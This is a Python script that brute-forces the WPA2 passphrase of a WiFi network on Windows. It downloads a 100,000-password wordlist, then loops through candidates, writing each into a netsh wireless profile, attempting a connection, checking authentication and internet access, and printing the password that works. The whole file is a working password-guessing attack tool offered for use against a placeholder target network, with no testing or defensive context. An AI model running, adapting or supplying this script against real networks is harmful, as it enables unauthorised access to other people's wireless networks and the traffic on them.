import os
import subprocess
import time
from urllib import request, error

# Function to download the password list if it doesn't exist
def download_password_list(url, filename):
    if not os.path.isfile(filename):
        try:
            print("Downloading password list...")
            request.urlretrieve(url, filename)
            print("Download complete.")
        except error.URLError as e:
            print(f"Failed to download password list: {e}")

# Function to check if the WiFi connection is established and authenticated with the target SSID
def check_connection(target_ssid):
    result_check = subprocess.run("netsh wlan show interfaces", shell=True, text=True, capture_output=True)
    if target_ssid in result_check.stdout:
        for line in result_check.stdout.splitlines():
            if "Authentication" in line and "WPA2" in line:
                return True  # Authenticated successfully with the correct password
    return False

# Additional function to confirm internet access
def confirm_internet_access():
    try:
        request.urlopen("http://www.google.com", timeout=3)  # Reduced timeout for speed
        return True
    except:
        return False

# Function to attempt connecting to a WiFi network using a password
def brute_force_wifi(target_ssid, password_file):
    print(f"Attempting to connect to SSID: {target_ssid}")
    
    # Convert SSID to hex with uppercase letters
    ssid_hex = target_ssid.encode("utf-8").hex().upper()  
    
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if len(password) < 8 or len(password) > 63:
                # print(f"Skipping password '{password}': Invalid length.")
                continue

            try:
                profile_name = f"TempProfile_{target_ssid.replace(' ', '_')}"

                # Generate the XML profile with uppercase hex
                xml_profile = f"""<?xml version="1.0"?>
                <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                    <name>{profile_name}</name>
                    <SSIDConfig>
                        <SSID>
                            <hex>{ssid_hex}</hex>
                            <name>{target_ssid}</name>
                        </SSID>
                    </SSIDConfig>
                    <connectionType>ESS</connectionType>
                    <connectionMode>auto</connectionMode>
                    <MSM>
                        <security>
                            <authEncryption>
                                <authentication>WPA2PSK</authentication>
                                <encryption>AES</encryption>
                                <useOneX>false</useOneX>
                            </authEncryption>
                            <sharedKey>
                                <keyType>passPhrase</keyType>
                                <protected>false</protected>
                                <keyMaterial>{password}</keyMaterial>
                            </sharedKey>
                        </security>
                    </MSM>
                    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
                        <enableRandomization>false</enableRandomization>
                        <randomizationSeed>1167962803</randomizationSeed>
                    </MacRandomization>
                </WLANProfile>"""

                xml_file = f"{profile_name}.xml"
                with open(xml_file, 'w') as xml_f:
                    xml_f.write(xml_profile)

                result_add = subprocess.run(f"netsh wlan add profile filename=\"{xml_file}\"", shell=True, text=True, capture_output=True)

                if "added" in result_add.stdout.lower():
                    print(f"Profile added successfully. Attempting to connect with password: {password}")

                    result_connect = subprocess.run(f"netsh wlan connect name=\"{profile_name}\"", shell=True, text=True, capture_output=True)
                    print(f"Connection attempt output: {result_connect.stdout.strip()}")

                    # Quickly check connection status
                    time.sleep(1)  # Minimal delay for network response
                    if check_connection(target_ssid) and confirm_internet_access():
                        print(f"Connected and authenticated successfully to {target_ssid} with password: {password}")
                        os.remove(xml_file)
                        subprocess.run(f"netsh wlan delete profile name=\"{profile_name}\"", shell=True, text=True)
                        return True
                    else:
                        print(f"Failed to authenticate using password: {password}.")

                os.remove(xml_file)
                subprocess.run(f"netsh wlan delete profile name=\"{profile_name}\"", shell=True, text=True)

            except Exception as e:
                print(f"An error occurred: {e}")
    
    print(f"Failed to connect to {target_ssid} after trying all passwords.")
    return False

# Example usage
if __name__ == "__main__":
    target_ssid = "SSID_NAME_LIKE_SWEET_HOME_OR_SOMETHING"
    password_file = "passwords.txt"
    download_password_list("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt", password_file)
    brute_force_wifi(target_ssid, password_file)
